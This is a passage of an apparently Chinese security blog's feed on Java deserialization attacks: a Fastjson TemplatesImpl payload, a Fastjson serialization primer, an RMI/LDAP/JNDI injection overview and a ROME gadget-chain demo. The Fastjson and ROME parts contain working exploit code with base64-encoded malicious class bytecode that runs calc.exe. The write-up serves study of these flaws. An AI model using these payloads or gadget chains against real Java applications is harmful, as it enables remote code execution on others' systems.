class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(s, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>回忆：在<strong>TemplateImpl</strong>中我们注意的点就是那三个参数值，两个不为空，一个要实例化。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112551.png" alt="QQ截图20220307193542"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071936060.png" alt="QQ截图20220307193608"></p><p>可以注意到，这里的<strong>name</strong> 、<strong>bytecode</strong>都有自己set方法，虽然是私有属性但是也可以赋值。<br>但是不碰巧这里的<strong>tfactory</strong>没有自己的set方法。<br>但是碰巧的是fastjson中</p><p><strong>如果开启了，Feature.SupportNonPublicField。在fastjson反序列化的时候会判断是否存在无参构造函数，如果存在的话就会直接去调用setter方法给属性赋值，而没有 setter 方法的属性如果开启了Feature.SupportNonPublicField的话也会通过反射去给属性赋值。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112058.png" alt="QQ截图20220307205404"></p><p>这里判断了<strong>SupportNonPublicField</strong></p><p>实在不想截图。最后就会调用到getO..方法。触发TemplatesImpl链。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112931.png" alt="QQ截图20220307211055"></p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI+LDAP+JRMP+JNDI（了解）</title>
    <link href="/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/"/>
    <url>/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p><strong>使客户机上运行的程序可以调用远程服务器上的对象。</strong></p><p>这里我们要清楚，在客户端从服务端传递都是以字节序列传递的，最终一定会经过反序列化。</p><h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><p>一种在使用RMI的过程中的协议，可以组织数据格式通过TCP进行传输，从而达到RMI。</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>一种java命名和目录的接口。而这里我们可以知道rmi和ldap也是目录服务系统。JNDI的接口下有许多目录系统服务（rmi、ldap），我们能够通过名称等去找到相关的对象，并且把它下载到客户端。</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>动态加载类这个技术就是为了实现，当本地没有定义远程对象所对应的类的时候，还能对远程对象进行调用。</p><p>具体实现逻辑为：</p><ul><li><p>客户端使用lookup函数访问一个本地不存在对应类的远程对象</p></li><li><p>服务端会返回一个reference对象，对象中会指定一个远程类让其去下载</p></li><li><p>客户端下载远程类并实例化，并且调用远程类的<strong>getObjectInstance</strong>函数获取外部远程对象实例。</p><p>综上，如果我们<strong>可以控制lookup函数的值</strong>，那么让其访问一个我们自己的恶意rmi服务器，让其下载我们构造的恶意class文件并实例话，即可实现任意代码执行。</p></li></ul><h2 id="RMI-LDAP注入版本问题"><a href="#RMI-LDAP注入版本问题" class="headerlink" title="RMI+LDAP注入版本问题"></a>RMI+LDAP注入版本问题</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071836554.png"></p><p>简单了解一下。因为想弄fastjson。后续在复习具体的实现步骤。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（入门）</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（入门）"><a href="#Fastjson（入门）" class="headerlink" title="Fastjson（入门）"></a>Fastjson（入门）</h1><p>跟着先知社区再来复习一下。本文纯按照先知社区的复习。基本雷同。<a href="https://xz.aliyun.com/t/8979">https://xz.aliyun.com/t/8979</a></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">20</span>);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);<br>        System.out.println(s);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SerializerFeature.WriteClassName</code>是<code>toJSONString</code>设置的一个属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名，<code>type</code>可以指定反序列化的类，并且调用其<code>getter/setter/is</code>方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734193.png" alt="QQ截图20220307161936"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>两种反序列化的方式。<strong>parseObject</strong>和<strong>parse</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(s));<br>        System.out.println(JSON.parseObject(s));<br>        System.out.println(JSON.parseObject(s,Person.class));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是这里只有第三步才指明了对象，并且讲Person反序列。而且这里<strong>并没有触发getter方法。</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734792.png" alt="QQ截图20220307162915"></p><p>这时候我们就可以理解到@type的作用了。指定一个类反序列化。<br>看看效果。分别测试。</p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse()"></a>JSON.parse()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>   System.out.println(JSON.parse(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734823.png" alt="QQ截图20220307163225"></p><p><strong>没有触发getter方法。</strong></p><h3 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject()"></a>JSON.parseObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>       System.out.println(JSON.parseObject(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071634121.png" alt="QQ截图20220307163400"></p><p>均触发。<br>那我们就可以思考这样的指定类反序列化。肯定会造成反序列化漏洞。<br>只要在setter、getter、is中添加恶意命令。</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>在分别对应的地方添加。发现均可弹出计算器。</p><h2 id="反序列化的流程"><a href="#反序列化的流程" class="headerlink" title="反序列化的流程"></a>反序列化的流程</h2><p>这里只说一些关键部分。（个人认为）</p><p>通过这里判断的为12。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071721973.png" alt="QQ截图20220307172125"></p><p>会来到这里。这里的<strong>LBRACE&#x3D;12</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734973.png" alt="QQ截图20220307172241"></p><p><strong>scanSymbol</strong>获取到了指定的@type类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734456.png" alt="QQ截图20220307172427"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734100.png" alt="QQ截图20220307172608"></p><p>后面跟进会知道过滤了反序列化的类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734839.png" alt="QQ截图20220307172959"></p><p>后面应该要学习一下RMI方面的相关知识。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROME链</title>
    <link href="/2022/03/06/ROME%E9%93%BE/"/>
    <url>/2022/03/06/ROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>终于把他弄明白了。<br>先来看看利用链。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar">http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar</a><br>自行导入一下。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure><h2 id="ObjectBean-toString"><a href="#ObjectBean-toString" class="headerlink" title="ObjectBean#toString()"></a>ObjectBean#toString()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206065.png" alt="QQ截图20220306120645"></p><p>跟进<strong>toString()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420748.png" alt="QQ截图20220306121009"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061210855.png" alt="QQ截图20220306121028"></p><p>获取调用链中上一个类或 <code>_obj</code> 属性中保存对象的类名（对本题得作用不大），并调用第二个 toString 方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420891.png" alt="QQ截图20220306123426"></p><p>这里会将_obj实例中的getter方法全部执行，那么就想到了,之前分析的文章<br><strong>CommonsBeanutils无cc依赖</strong>里面用到的调用getter方法，从而成功加载恶意类。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span 